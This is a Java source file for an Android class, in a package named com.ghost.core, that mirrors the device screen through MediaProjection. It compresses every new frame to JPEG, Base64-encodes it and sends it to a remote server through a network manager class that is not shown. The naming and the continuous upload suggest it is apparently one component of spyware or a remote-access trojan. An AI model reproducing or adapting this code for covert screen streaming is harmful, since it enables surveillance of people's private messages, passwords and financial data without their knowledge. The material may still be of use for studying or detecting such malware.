// ScreenCapture.java
package com.ghost.core;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCapture {
    
    private Context context;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private NetworkManager networkManager;
    
    private int width;
    private int height;
    private int dpi;
    
    public ScreenCapture(Context context) {
        this.context = context;
        this.networkManager = new NetworkManager(context);
        
        WindowManager windowManager = (WindowManager) 
            context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        
        width = metrics.widthPixels;
        height = metrics.heightPixels;
        dpi = metrics.densityDpi;
        
        backgroundThread = new HandlerThread("ScreenCapture");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    public void startCapture(MediaProjection projection) {
        this.mediaProjection = projection;
        
        imageReader = ImageReader.newInstance(width, height, 
            PixelFormat.RGBA_8888, 2);
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(), null, backgroundHandler
        );
        
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                sendImage(image);
                image.close();
            }
        }, backgroundHandler);
    }
    
    private void sendImage(Image image) {
        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
        byte[] bytes = new byte[buffer.remaining()];
        buffer.get(bytes);
        
        Bitmap bitmap = Bitmap.createBitmap(
            image.getWidth(), image.getHeight(),
            Bitmap.Config.ARGB_8888
        );
        bitmap.copyPixelsFromBuffer(ByteBuffer.wrap(bytes));
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] jpegData = baos.toByteArray();
        
        // Encoder en Base64 pour l'envoi
        String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
        
        // Envoyer au serveur
        networkManager.sendData("screenshot", base64);
    }
    
    public void captureNow() {
        if (imageReader != null) {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                sendImage(image);
                image.close();
            }
        }
    }
    
    public void stopCapture() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }
}
